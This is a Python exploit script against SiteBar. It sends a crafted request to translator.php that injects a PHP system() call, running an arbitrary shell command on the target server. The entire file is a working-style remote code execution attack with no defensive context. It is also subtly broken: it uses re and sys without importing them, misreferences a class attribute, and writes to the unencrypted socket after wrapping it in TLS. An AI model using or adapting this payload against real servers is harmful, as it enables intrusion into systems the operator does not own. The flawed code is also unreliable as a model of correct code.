import ssl
import socket

class Exploit:
    # SiteBar Input-validation.
    # Command Injection / RCE

    URL_PATTERN = re.compile('^(.*://)?([A-Za-z0-9\-\.]+)(:[0-9]+)?(.*)$')
    HEADER_END = re.compile('\r\n\r\n')

    def __init__(self, host: str, command: str):
        self.host    = host
        self.command = command

    def execute(self):
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)

        URL_DATA = re.match(URL_PATTERN, self.host)
        PROTOCOL = URL_DATA.groups()[0][:-3]
        HOSTNAME = URL_DATA.groups()[1]
        PATHNAME = URL_DATA.groups()[3] if URL_DATA.groups()[3] != '' else '/'
        PORT = 80 if PROTOCOL == 'http' else 443
        BUFFER_SIZE = 4096

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_sock = context.wrap_socket(s, server_hostname=HOSTNAME)
        s_sock.connect((HOSTNAME, PORT))

        message = 'GET /translator.php?lang=zh_CN&cmd=upd&edit=$GET["lang"];system(%s) HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' % (self.command, self.host)
        s.send(message.encode('utf-8'))

        resp = bytearray()

        while True:
            part = s_sock.recv(BUFFER_SIZE)
            if not part: break
            resp += part

        s_sock.close()

def main():
    if len(sys.argv) < 3:
        print(f'Usage: py {sys.argv[0]} <host> <command>')
        sys.exit()

    host    = sys.argv[1]
    command = sys.argv[2]

    exploit = Exploit(host, command)
    exploit.execute()

if __name__ == '__main__': main()